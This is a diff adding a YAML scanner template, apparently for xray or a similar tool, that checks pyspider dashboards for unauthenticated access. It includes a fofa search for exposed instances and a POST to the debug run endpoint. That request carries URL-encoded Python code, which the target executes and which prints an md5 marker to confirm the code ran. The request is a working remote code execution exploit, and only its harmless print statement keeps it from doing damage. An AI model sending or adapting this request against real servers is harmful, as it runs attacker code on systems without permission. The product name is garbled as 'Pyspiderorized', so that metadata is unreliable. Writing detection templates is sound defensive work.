@@ -1,0 +1,32 @@
+id: poc-yaml-pyspider-unauthorized-access
+info:
+  name: Pyspiderorized Access 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: Pyspiderorized
+  reference: []
+  description: null
+  fofa: title="Dashboard - pyspider"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+transport: http
+requests:
+- method: POST
+  path: /debug/pyspidervulntest/run
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print('{{.t2}}')&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
+  redirect: false
+  raw: null
+  timeout: null
+  expression: 'status_code == 200 &&
+
+    contains(body, t2) &&
+
+    contains(body,"\"logs\":") &&
+
+    contains(content_type,"application/json")
+
+    '
